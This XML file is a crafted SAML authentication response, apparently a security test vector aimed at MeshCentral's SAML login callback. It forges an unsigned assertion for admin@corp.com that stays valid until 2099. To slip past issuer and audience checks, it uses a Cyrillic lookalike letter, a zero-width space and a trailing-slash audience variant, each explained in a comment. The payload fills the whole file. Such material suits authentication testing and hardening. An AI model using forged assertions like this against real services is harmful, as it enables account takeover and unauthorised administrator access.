<?xml version="1.0" encoding="UTF-8"?>
<!-- VECTOR: Issuer spoofing with lookalike/homoglyph characters and Unicode normalization — IdP lookup uses string comparison, may match wrong IdP config -->
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_issuer001"
                Version="2.0"
                IssueInstant="2026-01-01T00:00:00Z"
                Destination="https://meshcentral.example.com/auth-saml-callback">
  <!-- Homoglyph: Cyrillic 'е' (U+0435) instead of Latin 'e' in idp.example.com -->
  <saml:Issuer>https://idp.&#x0435;xample.com/saml</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_assertion_issuer" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
    <!-- Issuer in assertion uses zero-width space to differ from Response-level issuer -->
    <saml:Issuer>https://idp.example.com&#x200B;/saml</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@corp.com</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z"
                                      Recipient="https://meshcentral.example.com/auth-saml-callback"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z">
      <saml:AudienceRestriction>
        <!-- Audience with trailing slash variant -->
        <saml:Audience>meshcentral/</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
  </saml:Assertion>
</samlp:Response>
